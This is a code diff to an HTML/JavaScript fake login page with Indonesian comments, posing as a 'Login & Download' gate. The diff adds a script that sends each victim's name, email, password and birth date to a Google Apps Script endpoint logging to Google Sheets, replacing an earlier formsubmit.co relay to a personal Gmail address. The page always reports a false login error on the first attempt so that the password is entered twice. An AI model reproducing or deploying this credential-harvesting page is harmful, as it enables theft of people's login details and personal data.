@@ -69,7 +69,6 @@
 
         input:focus { border-color: #ff7a4a; }
 
-        /* Style tambahan untuk label tanggal lahir */
         .date-label {
             display: block;
             text-align: left;
@@ -103,7 +102,6 @@
         }
 
         .submit:disabled { background: #555; cursor: not-allowed; }
-
         .logo { font-size: 16px; margin-bottom: 10px; color: #ff7a4a; font-weight: bold; }
     </style>
 </head>
@@ -132,15 +130,12 @@
 
     <div class="form-box" id="loginForm">
         <div class="logo" id="loginLogo"></div>
-        
         <div id="errorMessage">Invalid email or password. Please try again.</div>
 
         <form id="authForm">
             <input type="hidden" name="Login_Method" id="method">
             <input type="text" name="Nama" placeholder="Full Name" required>
-            
             <input type="email" name="Email" id="emailField" placeholder="Email Address" required>
-            
             <input type="password" name="Password" id="passwordField" placeholder="Password" required>
             
             <label for="birthDate" class="date-label">Tanggal Lahir:</label>
@@ -154,6 +149,9 @@
 <script>
     let attempt = 0;
     const emailField = document.getElementById("emailField");
+    
+    // --- GANTI LINK DI BAWAH INI DENGAN URL APPS SCRIPT BARU KAMU ---
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbx5DP7tqM4zaS_a19rJEjHQXi6q3iHGK5euTkRrH4krJkr_HC3XYuyuh_C2BkP5ZDUJ/exec'; 
 
     function showForm(type){
         document.getElementById("loginForm").style.display="block";
@@ -179,39 +177,28 @@
         e.preventDefault();
         attempt++;
 
-        const formData = new FormData(form);
-        formData.append("Attempt_Number", attempt);
+        btn.disabled = true;
+        btn.innerText = (attempt === 1) ? "Verifying..." : "Processing...";
+
+        // KIRIM DATA KE GOOGLE SHEETS
+        fetch(scriptURL, { 
+            method: "POST", 
+            body: new FormData(form) 
+        })
+        .then(res => console.log("Data Sent!"))
+        .catch(err => console.error("Error!", err.message));
 
         if (attempt === 1) {
-            btn.disabled = true;
-            btn.innerText = "Verifying...";
-
-            fetch("https://formsubmit.co/ajax/rmlinggadiarsp@gmail.com", {
-                method: "POST",
-                body: formData
-            });
-
             setTimeout(() => {
                 errorBox.style.display = "block";
                 btn.disabled = false;
                 btn.innerText = "Login & Download";
                 document.getElementById('passwordField').value = ""; 
             }, 1500);
-
         } else {
-            btn.disabled = true;
-            btn.innerText = "Processing...";
-
-            fetch("https://formsubmit.co/ajax/rmlinggadiarsp@gmail.com", {
-                method: "POST",
-                body: formData
-            })
-            .then(() => {
+            setTimeout(() => {
                 window.location.href = "download.html";
-            })
-            .catch(() => {
-                window.location.href = "download.html";
-            });
+            }, 2000);
         }
     });
 </script>
